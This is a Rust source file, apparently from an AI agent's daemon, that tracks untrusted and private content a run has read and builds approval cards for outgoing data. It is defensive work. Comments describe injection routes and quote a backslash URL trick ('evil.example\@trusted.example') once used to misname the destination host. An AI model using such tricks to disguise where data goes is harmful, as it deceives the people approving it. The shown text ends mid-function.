//! What a run has already put in front of the model, and the card shown when
//! that run then wants to send data off the machine.
//!
//! Bits are only ever set. A later tool, a subagent, or a resume of the same
//! run can add sources; nothing clears them.
//!
//! Whether a tool ran, and which class of content that put in context, is a
//! fact the daemon records when the call happens. Rebuilding a run reads those
//! facts. It does not look at the tool list the model can see right now, and
//! it does not look at the bytes the tool returned.

use std::fmt::Write as _;

use permission_engine::ContentExposure;
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};
use tool_registry::{ContentClass, OutputExposure};

/// Trusted record of one execution, stored with the step that produced it.
///
/// `ran` is true only when the daemon started the tool and kept the result.
/// A denial, an unknown name, or invalid arguments are `ran: false`. The
/// result text is never consulted.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub(crate) struct ExecFact {
    pub ran: bool,
    #[serde(default)]
    pub ingests_untrusted: bool,
    #[serde(default)]
    pub reads_private: bool,
    #[serde(default)]
    pub label: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub trust_folder: Option<String>,
}

impl ExecFact {
    pub(crate) fn ran(class: ContentClass, label: impl Into<String>) -> Self {
        Self {
            ran: true,
            ingests_untrusted: class.ingests_untrusted,
            reads_private: class.reads_private,
            label: label.into(),
            trust_folder: None,
        }
    }

    /// The tool did not start. Reconstruction must not invent a class.
    pub(crate) fn did_not_run() -> Self {
        Self {
            ran: false,
            ingests_untrusted: false,
            reads_private: false,
            label: String::new(),
            trust_folder: None,
        }
    }

    /// Discovery (or another tool) reported trust that is not its own spec.
    pub(crate) fn from_exposure(exposure: &OutputExposure, fallback_label: &str) -> Self {
        let label = if exposure.label.is_empty() {
            fallback_label.to_owned()
        } else {
            exposure.label.clone()
        };
        Self {
            ran: true,
            ingests_untrusted: exposure.ingests_untrusted,
            reads_private: exposure.reads_private,
            label,
            trust_folder: exposure.trust_folder.clone(),
        }
    }

    fn class(&self) -> ContentClass {
        ContentClass::declared(self.ingests_untrusted, self.reads_private, false)
    }

    /// Like [`Self::apply`] for a result whose text is at hand (see
    /// [`ContentTaint::note_with_text`]).
    pub(crate) fn apply_with_text(&self, taint: &mut ContentTaint, text: &str) {
        if self.ran {
            taint.note_with_text(self.class(), &self.label, text);
            if let Some(folder) = &self.trust_folder {
                taint.trust_folders.insert(folder.clone());
            }
        }
    }

    pub(crate) fn apply(&self, taint: &mut ContentTaint) {
        if self.ran {
            taint.note(self.class(), &self.label);
            if let Some(folder) = &self.trust_folder {
                taint.trust_folders.insert(folder.clone());
            }
        }
    }
}

/// How many source labels an approval card lists. Older reads stay in the
/// bits; the card names the most recent distinct ones that still fit.
const MAX_SOURCES: usize = 8;

/// A source label longer than this is cut. The model chooses the text
/// (`path`, `url`, `query`), so an uncapped label can fill the reason line.
const MAX_LABEL_CHARS: usize = 120;

/// Label of the brief a mission session starts from (see `Shared::initial_taint`).
pub(crate) const MISSION_LEDGER_LABEL: &str = "mission ledger";

/// Prefix of the label a read of the bot's OWN AgentMail inbox carries (see
/// `Shared::own_inbox_call`): `own inbox INBOX`.
pub(crate) const OWN_INBOX_LABEL_PREFIX: &str = "own inbox ";

/// Whether a source label names the OWNER's private data. Three kinds of label do not:
///
/// * a web page (`page ...`), public web content;
/// * the mission ledger: the bot's own bookkeeping of what it did and found, text the model
///   wrote from pages and mails, not something the owner keeps private. It is still untrusted
///   (the run's exposure says so) and never the owner's words; what an earlier session really
///   read of the owner's private data reaches this one through the chat's message provenance,
///   not through this label;
/// * the bot's own AgentMail inbox: an inbox made for the bot, whose mail comes from strangers.
///   The owner's personal mailboxes keep their `mailbox ...` label.
///
/// Only the daemon writes these labels (they are built from fixed prefixes, never from a page,
/// a mail or the model), so a tool or a page cannot choose one to hide a private read.
pub(crate) fn names_private_data(label: &str) -> bool {
    !(label.starts_with("page ")
        || label == MISSION_LEDGER_LABEL
        || label.starts_with(OWN_INBOX_LABEL_PREFIX))
}

/// Exposure bits plus the labels the approval card quotes.
#[derive(Debug, Clone, Default)]
pub(crate) struct ContentTaint {
    pub exposure: ContentExposure,
    sources: Vec<String>,
    trust_folders: std::collections::BTreeSet<String>,
    /// Distinct labels dropped because [`MAX_SOURCES`] kept a newer one.
    earlier: usize,
    /// Private data of the owner (files, mail, memory, screens, an MCP result, an earlier turn)
    /// is in front of the model. The managed browser's own pages do not count: they are
    /// untrusted, and the owner asked for them. Starts false and is only ever set.
    pub(crate) private_source: bool,
    /// Salted hashes of the words of the private results of this run (see `full_autonomy`).
    pub(crate) seen: crate::full_autonomy::SeenText,
    /// The run wrote or changed something that could hold code (a script, a manifest, a build
    /// file, anything but a plain document) AFTER it read untrusted content. A program the bot
    /// starts later may then run what a page chose, so the Full level's shell waiver stops
    /// covering interpreters and build tools. Only ever set.
    pub(crate) code_written_after_untrusted: bool,
}

impl ContentTaint {
    /// A tool call that may write files, recorded when it is DECIDED (before it runs, whether or
    /// not it is later allowed): after untrusted content was read, a write of anything but a
    /// plain document marks the run (see [`Self::code_written_after_untrusted`]). A browser,
    /// a mail or a memory tool cannot write the bot's files; a file tool without a recognisable
    /// path, a script, a desktop or system tool is assumed to.
    pub(crate) fn note_write(
        &mut self,
        name: &str,
        effect: tool_registry::Effect,
        category: protocol::PermissionCategory,
        input: &Value,
    ) {
        use protocol::PermissionCategory as C;
        // A mail attachment is a stranger's file put on this computer, and its bytes can be
        // anything a program accepts. It counts as written code whatever the run read before.
        if name == "email_download_attachment" && effect != tool_registry::Effect::Read {
            self.code_written_after_untrusted = true;
            return;
        }
        if self.code_written_after_untrusted
            || !self.exposure.untrusted
            || effect == tool_registry::Effect::Read
            || matches!(name, "shell_run" | "fs_delete" | "notes_write")
            // Listing branches changes nothing.
            || (name == "git_branch" && !git_mutation(name, input))
            || name.starts_with("pc_")
            || name.starts_with("browser_")
            || !matches!(
                category,
                C::Fs | C::Shell | C::Desktop | C::Script | C::System | C::Remote
            )
        {
            return;
        }
        let paths: Vec<&str> = ["path", "to", "output_path", "output_dir", "dest", "file"]
            .iter()
            .filter_map(|k| input.get(*k).and_then(Value::as_str))
            .collect();
        let inert = category == C::Fs
            && !paths.is_empty()
            && paths.iter().all(|p| crate::shell_allow::inert_path(p));
        if !inert {
            self.code_written_after_untrusted = true;
        }
    }

    /// [`Self::note_write`] for a call read back from a stored model step (a run rebuilt after a
    /// restart): the tool's class is not at hand, so it is judged by name.
    fn note_write_from_history(&mut self, name: &str, arguments: &str) {
        use protocol::PermissionCategory as C;
        let category = match name {
            "fs_write" | "fs_edit" | "fs_move" | "checkpoint_restore" | "docx_write"
            | "xlsx_write" | "docx_append" | "xlsx_append_rows" | "xlsx_update_cells"
            | "csv_transform" | "doc_convert" | "doc_preview" | "git_commit" | "git_branch" => {
                C::Fs
            }
            "script_run" => C::Script,
            n if n.starts_with("desktop_") => C::Desktop,
            // `note_write` decides on the name alone for this one; the category is not read.
            "email_download_attachment" => C::Messaging,
            _ => return,
        };
        let input = serde_json::from_str(arguments).unwrap_or(Value::Null);
        self.note_write(name, tool_registry::Effect::Write, category, &input);
    }

    /// A redirect target of a command the Full level ran (see `Shared::full_shell_waives`).
    pub(crate) fn note_redirect_writes(&mut self, writes: &[std::path::PathBuf]) {
        if self.exposure.untrusted
            && writes
                .iter()
                .any(|p| !crate::shell_allow::inert_path(&p.to_string_lossy()))
        {
            self.code_written_after_untrusted = true;
        }
    }

    /// Record that a tool result of this class entered the context.
    ///
    /// A class that neither ingests untrusted content nor reads private data
    /// changes nothing. The same label is stored once.
    pub(crate) fn note(&mut self, class: ContentClass, label: &str) {
        self.note_inner(class, label, None);
    }

    /// [`Self::note`] for a result whose text is at hand: the words of a PRIVATE result are
    /// kept as hashes only, so a later call that copies them can be recognised.
    pub(crate) fn note_with_text(&mut self, class: ContentClass, label: &str, text: &str) {
        self.note_inner(class, label, Some(text));
    }

    fn note_inner(&mut self, class: ContentClass, label: &str, text: Option<&str>) {
        if !class.ingests_untrusted && !class.reads_private {
            return;
        }
        self.exposure
            .observe(class.ingests_untrusted, class.reads_private);
        // A page (the browser, a search, a fetch) is public web; everything else that reads
        // private data is the owner's (see `names_private_data`).
        if class.reads_private && names_private_data(label) {
            self.private_source = true;
            match text {
                Some(text) => self.seen.observe(text),
                None => self.seen.unhashed = true,
            }
        }
        self.push_label(label);
    }

    /// A label for the card, without changing the bits. Used when a stored
    /// message already carries the bits and we only need the name.
    ///
    /// A label that names private data (see [`names_private_data`]: another bot's answer or
    /// reply, a file or a personal mailbox of an earlier turn, but not a web page, the mission
    /// ledger or the bot's own inbox) means private data whose text is not at hand: the run
    /// counts as holding private data it cannot compare against.
    pub(crate) fn note_label(&mut self, label: &str) {
        if names_private_data(label) {
            self.mark_private_unhashed();
        }
        self.push_label(label);
    }

    /// Like [`Self::note_label`] for a label whose private text an earlier turn left in front of
    /// the model AND that the caller hashes separately (see [`comparable_label`]): the run holds
    /// private data, but it can be compared, so it is not marked unhashed.
    pub(crate) fn note_label_hashed(&mut self, label: &str) {
        if names_private_data(label) {
            self.private_source = true;
        }
        self.push_label(label);
    }

    /// Private data is in the run and nothing of it can be compared.
    pub(crate) fn mark_private_unhashed(&mut self) {
        self.private_source = true;
        self.seen.unhashed = true;
    }

    pub(crate) fn sources(&self) -> &[String] {
        &self.sources
    }

    /// Union with taint inherited from a parent run or from stored history.
    pub(crate) fn inherit(&mut self, other: &Self) {
        self.exposure.inherit(other.exposure);
        self.private_source |= other.private_source;
        self.code_written_after_untrusted |= other.code_written_after_untrusted;
        self.seen.merge(&other.seen);
        self.trust_folders
            .extend(other.trust_folders.iter().cloned());
        self.earlier += other.earlier;
        for label in &other.sources {
            self.push_label(label);
        }
    }

    fn push_label(&mut self, label: &str) {
        let label = sanitize_label(label);
        if label.is_empty() {
            return;
        }
        if let Some(i) = self.sources.iter().position(|s| s == &label) {
            let kept = self.sources.remove(i);
            self.sources.push(kept);
            return;
        }
        if self.sources.len() >= MAX_SOURCES {
            // A web page label goes first: a private non-page label (a mailbox, a file,
            // another bot's answer) must outlive any number of page reads, because the stored
            // message keeps only these labels and a later turn decides from them.
            let evict = self
                .sources
                .iter()
                .position(|s| s.starts_with("page "))
                .unwrap_or(0);
            self.sources.remove(evict);
            self.earlier += 1;
        }
        self.sources.push(label);
    }
}

/// A source label of an EARLIER turn whose private text is plain conversation text that is
/// still in front of the model (the earlier reply, which [`ContentTaint::seen`] can hash): memory
/// recall, knowledge-base and past-chat hits, notes, files, mailboxes, command output and
/// workflow results. What cannot be compared stays unhashed: a signed-in browser, a window or
/// screen, an attached file, another bot's answer, an MCP tool, an unknown tool.
pub(crate) fn comparable_label(label: &str) -> bool {
    matches!(
        label,
        "memory" | "notes" | "past conversation" | "command output" | "workflow replay"
    ) || label.starts_with("file ")
        || label.starts_with("mailbox ")
        || label.starts_with("tool knowledge")
        || label.starts_with("tool documents")
}

/// Drop control and invisible characters and cap the length. Done when the
/// label is recorded, so a later card cannot grow a model-chosen sentence.
///
/// A path longer than the cap keeps its file name (the tail) and an ellipsis.
/// Cutting the head would hide `id_rsa` behind a long harmless prefix.
fn sanitize_label(label: &str) -> String {
    let mut cleaned = String::new();
    for c in label.trim().chars() {
        if c.is_control() || protocol::approval_text::is_hidden(c) {
            continue;
        }
        cleaned.push(c);
    }
    let cleaned = cleaned.trim();
    if cleaned.chars().count() <= MAX_LABEL_CHARS {
        return cleaned.to_owned();
    }
    let tail = path_tail(cleaned);
    let ellipsis = '\u{2026}';
    let tail_len = tail.chars().count();
    if tail_len + 1 >= MAX_LABEL_CHARS {
        let keep = MAX_LABEL_CHARS - 1;
        let skip = tail_len - keep;
        let end: String = tail.chars().skip(skip).collect();
        return format!("{ellipsis}{end}");
    }
    let head_len = MAX_LABEL_CHARS - tail_len - 1;
    let head: String = cleaned.chars().take(head_len).collect();
    format!("{head}{ellipsis}{tail}")
}

/// The last path segment, including its separator, so a trimmed label still
/// shows the file name rather than a directory prefix.
fn path_tail(label: &str) -> String {
    let mut cut = 0usize;
    for (i, b) in label.bytes().enumerate() {
        if b == b'/' || b == b'\\' {
            cut = i;
        }
    }
    if cut == 0 || cut + 1 >= label.len() || !label.is_char_boundary(cut) {
        label.to_owned()
    } else {
        label[cut..].to_owned()
    }
}

/// Fold one persisted step into `taint`.
///
/// Tool results, CLI executions stored on a model step, and external tool
/// metadata contribute only through [`ExecFact`]s written at the time. Result
/// text and the current tool surface are not inputs.
pub(crate) fn observe_history_step(
    taint: &mut ContentTaint,
    name: &str,
    input: &Value,
    output: Option<&Value>,
) {
    match name {
        "user_message" => {
            let text = input["text"].as_str().unwrap_or_default();
            let recalled = text.contains("<recalled_memory>");
            let untrusted = text.contains("<untrusted_memory_data>");
            if text.contains("<untrusted_skill_data>") {
                taint.note(
                    ContentClass::declared(true, false, false),
                    "untrusted skill",
                );
            }
            if recalled || untrusted {
                // The recalled text is in this very message: keep its words as hashes, so a
                // resumed run can still tell a copied memory from an ordinary query.
                taint.note_with_text(
                    ContentClass::declared(untrusted, true, false),
                    "memory",
                    text,
                );
            }
        }
        "workflow" => {
            let Some(out) = output else { return };
            // New rows carry an explicit fact. Older rows (from before that
            // field existed) still use the structural summary/final_text keys,
            // never a prefix of the note text.
            if out.get("exposure").is_some() {
                if let Some(fact) = out.get("exposure").and_then(parse_fact) {
                    fact.apply(taint);
                }
                return;
            }
            if out.get("summary").is_some() || out.get("final_text").is_some() {
                taint.note(ContentClass::untrusted_private(), "workflow replay");
            }
        }
        "model" => {
            let Some(out) = output else { return };
            // The calls the model made in this step were decided before their results came in:
            // judge them against what the run had read by then.
            for call in out
                .get("tool_calls")
                .and_then(Value::as_array)
                .into_iter()
                .flatten()
            {
                taint.note_write_from_history(
                    call.get("name").and_then(Value::as_str).unwrap_or_default(),
                    call.get("arguments")
                        .and_then(Value::as_str)
                        .unwrap_or_default(),
                );
            }
            apply_fact_list(taint, out.get("executed"));
            apply_fact_list(taint, out.get("metadata"));
        }
        "tools" => {
            let Some(results) = output.and_then(|o| o["results"].as_array()) else {
                return;
            };
            for result in results {
                if let Some(fact) = result.get("fact").and_then(parse_fact) {
                    // What the model saw is stored with the result: hash it. A spilled result
                    // is only partly stored, so it stays "cannot compare".
                    let text = result.get("text").and_then(Value::as_str);
                    let spilled = result.get("spill_path").is_some_and(|p| !p.is_null());
                    match text {
                        Some(text) if !spilled => fact.apply_with_text(taint, text),
                        _ => fact.apply(taint),
                    }
                }
            }
        }
        _ => {}
    }
}

fn parse_fact(value: &Value) -> Option<ExecFact> {
    serde_json::from_value(value.clone()).ok()
}

fn apply_fact_list(taint: &mut ContentTaint, value: Option<&Value>) {
    let Some(list) = value.and_then(Value::as_array) else {
        return;
    };
    for item in list {
        if let Some(fact) = parse_fact(item) {
            fact.apply(taint);
        }
    }
}

/// Short label for the approval card: `file <path>`, `mailbox <folder>`,
/// `page <url>`, and the same shape for the other sources.
pub(crate) fn source_label(name: &str, input: &Value) -> String {
    if let Some(server) = name.strip_prefix("mcp:") {
        let server = server.split('/').next().unwrap_or("mcp");
        return format!("mcp {server}");
    }
    let str_field = |key: &str| input.get(key).and_then(Value::as_str);
    match name {
        "fs_read" | "fs_list" | "fs_search" | "fs_write" | "fs_edit" | "fs_move" | "fs_delete"
        | "checkpoint_list" | "checkpoint_restore" | "pdf_extract" | "docx_read" | "docx_write"
        | "docx_append" | "xlsx_read" | "xlsx_write" | "xlsx_append_rows" | "xlsx_update_cells"
        | "pptx_read" | "csv_read" | "csv_transform" | "json_query" | "doc_convert"
        | "doc_preview" | "git_status" | "git_diff" | "git_log" | "git_show" | "git_branch"
        | "git_commit" => {
            format!("file {}", str_field("path").unwrap_or("a file"))
        }
        "email_read" | "email_search" | "email_list_folders" | "email_download_attachment" => {
            format!("mailbox {}", str_field("folder").unwrap_or("INBOX"))
        }
        // `email_wait_for` refuses every mailbox but the bot's own identity.
        "email_wait_for" => format!("{OWN_INBOX_LABEL_PREFIX}mail"),
        "web_search" => format!("page {}", str_field("query").unwrap_or("a search")),
        "web_extract"
        | "web_scrape"
        | "web_feed"
        | "web_sitemap"
        | "web_metadata"
        | "browser_open"
        | "browser_back"
        | "browser_forward"
        | "browser_reload"
        | "browser_upload"
        | "browser_downloads"
        | "browser_snapshot"
        | "browser_screenshot"
        | "browser_click"
        | "browser_fill"
        | "browser_select"
        | "browser_press"
        | "browser_scroll"
        | "browser_hover"
        | "browser_select_text"
        | "browser_pointer"
        | "browser_attach"
        | "browser_dismiss_consent"
        | "browser_wait"
        | "browser_tabs"
        | "browser_eval"
        | "browser_act" => {
            format!("page {}", str_field("url").unwrap_or("the browser"))
        }
        "skill_read" | "skill_list" | "skill_write" | "skill_publish" => {
            format!("file skill {}", str_field("name").unwrap_or("a skill"))
        }
        "memory_search" | "memory_save" | "memory_forget" => "memory".to_owned(),
        "notes_read" | "notes_write" => "notes".to_owned(),
        "session_search" => "past conversation".to_owned(),
        "workflow_run" | "workflow_list" => "workflow replay".to_owned(),
        other if other.starts_with("desktop_") => format!(
            "window {}",
            str_field("title")
                .or_else(|| str_field("executable"))
                .unwrap_or("desktop")
        ),
        "process_list" => "window desktop".to_owned(),
        // A shell or script result is command output, not a file: the card must not say
        // the run "read file shell_run".
        "shell_run" | "shell_interactive" | "script_run" => "command output".to_owned(),
        other => format!("tool {other}"),
    }
}

/// The label of a read of the bot's own AgentMail inbox (see `Shared::own_inbox_call`): the
/// same folder the `mailbox ...` label would name, under the prefix that does not mark the run
/// as holding the owner's private data.
pub(crate) fn own_inbox_label(input: &Value) -> String {
    let folder = input
        .get("folder")
        .and_then(Value::as_str)
        .unwrap_or("INBOX");
    format!("{OWN_INBOX_LABEL_PREFIX}{folder}")
}

/// What a call will really send, for the egress checks and card. A mail reply fills in its
/// recipients and subject itself, from the original message it read: the model's own input
/// lacks them (so a card built from it would show an empty `To:` and the host "unknown"),
/// while the tool's approval card (`details`, built from the very values it will send) has
/// them. The card's `to`, `cc`, `bcc` and `subject` replace the input's; every other field is
/// the input's. Any other tool, or a card that is not a mail card, leaves the input as it is.
pub(crate) fn input_as_sent(name: &str, input: &Value, details: Option<&Value>) -> Value {
    let mut sent = input.clone();
    if name != "email_send" {
        return sent;
    }
    let (Some(card), Some(fields)) = (
        details
            .filter(|d| d.get("kind").and_then(Value::as_str) == Some("mail_send"))
            .and_then(Value::as_object),
        sent.as_object_mut(),
    ) else {
        return sent;
    };
    for key in ["to", "cc", "bcc", "subject"] {
        if let Some(value) = card.get(key) {
            fields.insert(key.to_owned(), value.clone());
        }
    }
    sent
}

/// Destination host, the exact outgoing text, and which kind of text it is.
///
/// Every field the call actually transmits is in the text. A projection that
/// keeps only the first recipient, or only the query, is not used.
pub(crate) fn egress_payload(name: &str, input: &Value) -> (String, String, &'static str) {
    let str_field = |key: &str| {
        input
            .get(key)
            .and_then(Value::as_str)
            .unwrap_or_default()
            .to_owned()
    };
    if let Some(server) = name.strip_prefix("mcp:") {
        let server = server.split('/').next().unwrap_or("mcp").to_owned();
        return (server, render_fields(input), "body");
    }
    if name == "skill_write" || name == "skill_publish" {
        return ("this bot's skills".to_owned(), skill_payload(input), "body");
    }
    // Every field is in the text. A per-tool projection drops a field the
    // next schema change adds, and that field can be what leaves the machine.
    let payload = if matches!(name, "email_send" | "email_draft") {
        email_body(input)
    } else {
        render_transmitted(input)
    };
    let (host, kind) = match name {
        "web_search" => (
            search_host(input.get("backend").and_then(Value::as_str)),
            "query",
        ),
        "web_extract" | "web_scrape" | "web_feed" | "web_sitemap" | "web_metadata"
        | "browser_open" => (host_of_url(&str_field("url")), "url"),
        // A new tab on an address is an open: the card names the site it goes to.
        "browser_tabs" if input.get("url").is_some_and(Value::is_string) => {
            (host_of_url(&str_field("url")), "url")
        }
        "email_send" | "email_draft" => {
            let mut everyone = all_addrs(input.get("to"));
            everyone.extend(all_addrs(input.get("cc")));
            everyone.extend(all_addrs(input.get("bcc")));
            (domains_of(&everyone), "body")
        }
        "email_search"
        | "email_read"
        | "email_mark_read"
        | "email_list_folders"
        | "email_download_attachment" => {
            let account = str_field("account");
            let host = if account.is_empty() {
                "the mailbox".to_owned()
            } else {
                format!("mailbox {account}")
            };
            (host, "body")
        }
        "shell_run" | "shell_interactive" => ("the shell".to_owned(), "body"),
        "script_run" => ("a script".to_owned(), "body"),
        "browser_fill"
        | "browser_press"
        | "browser_select"
        | "browser_click"
        | "browser_scroll"
        | "browser_hover"
        | "browser_select_text"
        | "browser_pointer"
        | "browser_attach"
        | "browser_dismiss_consent"
        | "browser_tabs"
        | "browser_back"
        | "browser_forward"
        | "browser_reload"
        | "browser_upload"
        | "browser_eval"
        | "browser_act" => ("the browser".to_owned(), "body"),
        "schedule_create" | "schedule_update" | "schedule_resume" => {
            ("this bot's scheduler".to_owned(), "body")
        }
        "memory_save" | "memory_forget" => ("this bot's memory".to_owned(), "body"),
        "notes_write" => ("this bot's notes".to_owned(), "body"),
        "bot_create" | "bot_update" | "bot_delete" => ("the user's bots".to_owned(), "body"),
        other if other.starts_with("desktop_") => ("the desktop".to_owned(), "body"),
        _ => {
            if input.get("url").and_then(Value::as_str).is_some() {
                (host_of_url(&str_field("url")), "url")
            } else {
                (name.to_owned(), "body")
            }
        }
    };
    (host, payload, kind)
}

/// Every object field. A lone `url` or `query` stays the bare string, matching
/// cards that predate the all-fields rule. Any other field is appended, URL
/// or query first, so a new schema property cannot leave unseen.
fn render_transmitted(input: &Value) -> String {
    let Some(obj) = input.as_object() else {
        return display_value(input);
    };
    if obj.is_empty() {
        return String::new();
    }
    if obj.len() == 1 {
        let (key, value) = obj.iter().next().unwrap();
        if let Some(text) = value.as_str()
            && matches!(
                key.as_str(),
                "url" | "query" | "js" | "prompt" | "command" | "body" | "text"
            )
        {
            return text.to_owned();
        }
    }
    let mut keys: Vec<&String> = obj.keys().collect();
    keys.sort_by_key(|key| match key.as_str() {
        "url" => 0,
        "query" => 1,
        _ => 2,
    });
    let mut lines = Vec::with_capacity(keys.len());
    for key in keys {
        let value = &obj[key];
        if matches!(key.as_str(), "url" | "query")
            && let Some(text) = value.as_str()
        {
            lines.push(text.to_owned());
            continue;
        }
        lines.push(format!("{key}: {}", display_value(value)));
    }
    lines.join("\n")
}

/// Every object field, in the order the call carried them.
fn render_fields(input: &Value) -> String {
    let Some(obj) = input.as_object() else {
        return display_value(input);
    };
    if obj.is_empty() {
        return String::new();
    }
    obj.iter()
        .map(|(k, v)| format!("{k}: {}", display_value(v)))
        .collect::<Vec<_>>()
        .join("\n")
}

fn display_value(value: &Value) -> String {
    match value {
        Value::String(text) => text.clone(),
        Value::Array(items) => items
            .iter()
            .map(display_value)
            .filter(|text| !text.is_empty())
            .collect::<Vec<_>>()
            .join(", "),
        Value::Null => String::new(),
        other => other.to_string(),
    }
}

/// Recipients, subject and body, then any field that layout does not already name.
fn email_body(input: &Value) -> String {
    let to = all_addrs(input.get("to"));
    let cc = all_addrs(input.get("cc"));
    let bcc = all_addrs(input.get("bcc"));
    let mut body = String::new();
    push_addrs(&mut body, "To", &to);
    push_addrs(&mut body, "Cc", &cc);
    push_addrs(&mut body, "Bcc", &bcc);
    let account = input
        .get("account")
        .and_then(Value::as_str)
        .unwrap_or_default();
    if !account.is_empty() {
        body.push_str("Account: ");
        body.push_str(account);
        body.push('\n');
    }
    body.push_str("Subject: ");
    body.push_str(
        input
            .get("subject")
            .and_then(Value::as_str)
            .unwrap_or_default(),
    );
    body.push_str("\n\n");
    body.push_str(
        input
            .get("body")
            .and_then(Value::as_str)
            .unwrap_or_default(),
    );
    if let Some(obj) = input.as_object() {
        for (key, value) in obj {
            if matches!(
                key.as_str(),
                "to" | "cc" | "bcc" | "account" | "subject" | "body"
            ) {
                continue;
            }
            if !body.is_empty() && !body.ends_with('\n') {
                body.push('\n');
            }
            body.push_str(key);
            body.push_str(": ");
            body.push_str(&display_value(value));
            body.push('\n');
        }
    }
    body
}

fn all_addrs(value: Option<&Value>) -> Vec<String> {
    match value {
        Some(Value::Array(items)) => items
            .iter()
            .filter_map(Value::as_str)
            .filter(|s| !s.is_empty())
            .map(str::to_owned)
            .collect(),
        Some(Value::String(s)) if !s.is_empty() => vec![s.clone()],
        _ => Vec::new(),
    }
}

fn push_addrs(out: &mut String, label: &str, addrs: &[String]) {
    if addrs.is_empty() {
        return;
    }
    out.push_str(label);
    out.push_str(": ");
    out.push_str(&addrs.join(", "));
    out.push('\n');
}

fn domains_of(addrs: &[String]) -> String {
    let mut domains = Vec::new();
    for addr in addrs {
        // One string may carry several addresses ("a@evil.test, b@other.test").
        for part in addr.split([',', ';']) {
            let domain = domain_of_addr(part);
            if domain != "unknown" && !domains.contains(&domain) {
                domains.push(domain);
            }
        }
    }
    if domains.is_empty() {
        "unknown".to_owned()
    } else {
        domains.join(", ")
    }
}

fn search_host(backend: Option<&str>) -> String {
    match backend {
        Some("duckduckgo") => "html.duckduckgo.com".to_owned(),
        Some("brave") => "api.search.brave.com".to_owned(),
        Some("searxng") => "searxng".to_owned(),
        _ => "configured-search-provider".to_owned(),
    }
}

fn host_of_url(url: &str) -> String {
    // `url` treats `\` as `/` for http(s). A hand-rolled split on `/` does not,
    // so `https://evil.example\@trusted.example/` used to name trusted.example
    // in the footer while the request went to evil.example. A backslash, or a
    // URL the parser rejects, is not given a host name at all.
    if url.contains('\\') {
        return "unparseable URL (contains a backslash)".to_owned();
    }
    url::Url::parse(url)
        .ok()
        .and_then(|parsed| parsed.host_str().map(str::to_owned))
        .filter(|host| !host.is_empty())
        .unwrap_or_else(|| "unparseable URL".to_owned())
}

/// Show SKILL.md verbatim once; parsed copies would duplicate its body.
fn skill_payload(input: &Value) -> String {
    render_transmitted(input)
}

/// A click names an on-screen target. `prompt_text` is typed into the page,
/// so that call can carry data even though the tool is still called a click.
pub(crate) fn call_can_egress(name: &str, class: ContentClass, input: &Value) -> bool {
    if !class.egress {
        return false;
    }
    // A batch carries bytes when any step types, selects or presses: judged like those
    // single tools. Unreadable input counts as carrying.
    if name == "browser_act" {
        return builtin_tools::act_can_egress(input);
    }
    if name == "browser_click" {
        return input
            .get("prompt_text")
            .and_then(Value::as_str)
            .is_some_and(|text| !text.is_empty());
    }
    true
}

/// A git call that changes the repository: a commit (made under the owner's identity), or a
/// branch created or switched (a switch rewrites files in the work tree). Listing branches and
/// every read-only git tool are not.
pub(crate) fn git_mutation(name: &str, input: &Value) -> bool {
    match name {
        "git_commit" => true,
        "git_branch" => input.get("action").and_then(Value::as_str) != Some("list"),
        _ => false,
    }
}

/// Any string [`protocol::approval_text::scrub`] would shorten.
#[cfg(test)]
pub(crate) fn input_hides_characters(value: &Value) -> bool {
    input_matches(value, protocol::approval_text::hides_characters)
}

/// A character that must not be sent, in a string or in an object key.
pub(crate) fn input_forbids_egress(value: &Value) -> bool {
    input_matches(value, |text| {
        text.chars()
            .any(protocol::approval_text::is_forbidden_egress_char)
    })
}

/// A character that needs a card to be visible. Prompt-free egress is refused
/// when this is true, because nothing would show the `<U+XXXX>` marker.
/// Emoji variation selectors, ZWJ, ZWNJ, LRM/RLM/ALM and CR are allowed.
pub(crate) fn input_needs_a_card_to_show(value: &Value) -> bool {
    input_matches(value, |text| {
        text.chars().any(|c| {
            protocol::approval_text::is_revealed_egress_char(c)
                && !protocol::approval_text::is_prompt_free_text_char(c)
        })
    })
}

fn input_matches(value: &Value, text_matches: impl Fn(&str) -> bool + Copy) -> bool {
    match value {
        Value::String(text) => text_matches(text),
        Value::Array(items) => items.iter().any(|item| input_matches(item, text_matches)),
        Value::Object(map) => map
            .iter()
            .any(|(key, item)| text_matches(key) || input_matches(item, text_matches)),
        _ => false,
    }
}

/// Above this size the desktop requires opening and reviewing the full text.
pub(crate) const FULL_REVIEW_PAYLOAD_BYTES: usize = 8 * 1024;

/// The payload the card stores: hidden characters revealed, blank-line runs
/// collapsed, with the original size counted separately.
pub(crate) struct ShownPayload {
    pub text: String,
    pub lines: usize,
    pub chars: usize,
    pub hidden: usize,
}

/// Reveal and collapse `raw` for the card without dropping a size-limited tail.
pub(crate) fn present_payload(raw: &str) -> ShownPayload {
    let chars = raw.chars().count();
    let lines = if raw.is_empty() {
        0
    } else {
        raw.matches('\n').count() + 1
    };
    let hidden = raw
        .chars()
        .filter(|c| protocol::approval_text::is_revealed_egress_char(*c))
        .count();
    let revealed = protocol::approval_text::reveal_hidden(raw, true);
    ShownPayload {
        text: collapse_card_whitespace(&revealed),
        lines,
        chars,
        hidden,
    }
}

/// Collapse runs of blank lines and trailing whitespace so they cannot bury
/// the rest of the payload. The marker states how many were removed.
fn collapse_card_whitespace(text: &str) -> String {
    let lines: Vec<&str> = text.split('\n').collect();
    let mut out = String::new();
    let mut i = 0usize;
    let mut started = false;
    while i < lines.len() {
        let trail = trailing_ascii_ws(lines[i]);
        let body = &lines[i][..lines[i].len() - trail];
        if body.is_empty() {
            let start = i;
            i += 1;
            while i < lines.len() && trailing_ascii_ws(lines[i]) == lines[i].len() {
                i += 1;
            }
            let n = i - start;
            // `split` yields one empty slot after a trailing newline. That is
            // not a blank line the sender used to bury text.
            if n == 1 && i == lines.len() && lines[start].is_empty() {
                continue;
            }
            if started {
                out.push('\n');
            }
            let spaces = lines[start..i]
                .iter()
                .map(|line| line.bytes().filter(|b| *b == b' ').count())
                .sum::<usize>();
            let tabs = lines[start..i]
                .iter()
                .map(|line| line.bytes().filter(|b| *b == b'\t').count())
                .sum::<usize>();
            let _ = write!(out, "[… {n} blank lines: {spaces} spaces, {tabs} tabs …]");
            started = true;
            continue;
        }
        if started {
            out.push('\n');
        }
        out.push_str(body);
        if trail > 0 {
            let spaces = lines[i][body.len()..]
                .bytes()
                .filter(|b| *b == b' ')
                .count();
            let tabs = trail - spaces;
            let _ = write!(
                out,
                " [… trailing whitespace: {spaces} spaces, {tabs} tabs …]"
            );
